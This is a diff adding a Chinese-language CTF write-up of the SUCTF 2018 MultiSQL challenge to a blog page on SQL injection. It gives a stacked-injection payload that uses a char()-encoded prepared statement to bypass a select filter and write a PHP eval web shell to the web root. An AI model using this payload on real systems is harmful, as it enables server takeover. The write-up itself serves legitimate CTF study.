@@ -248,6 +248,26 @@
 <p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，将<strong>sql语句中的”||”作用修改为拼接字符串</strong>。此时就可以让”1”和flag字段拼接起来，返回查询结果。</p>
 <img src="/images/buu中的sql注入刷题总结/image-20200731115949826.png" style="zoom:67%;">
 
+
+
+<h3 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h3><p>容易发现/user/user.php的id参数存在注入</p>
+<img src="/images/buu中的sql注入刷题总结/image-20201023123614588.png" alt="image-20201023123614588" style="zoom:50%;">
+
+<p>测试发现<strong>select被过滤</strong>，但是存在堆叠注入。</p>
+<blockquote>
+<p>过滤了select然后存在堆叠注入的可以使用<strong>预处理注入</strong>，尝试写入shell，因为过滤了select等字符，<strong>使用<code>char()</code>绕过</strong></p>
+</blockquote>
+<p>需要执行的代码为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[_]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/favicon/shell.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>将其转化为<code>char()</code>形式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><br></pre></td></tr></table></figure>
+
+<p>最终payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>同样熟悉的场景，先采用万能密码登陆，但是发现登陆成功后不是直接给flag了，而是告诉我admin用户的密码。</p>
 <img src="/images/buu中的sql注入刷题总结/image-20200731121151110.png" alt="image-20200731121151110" style="zoom:67%;">
 
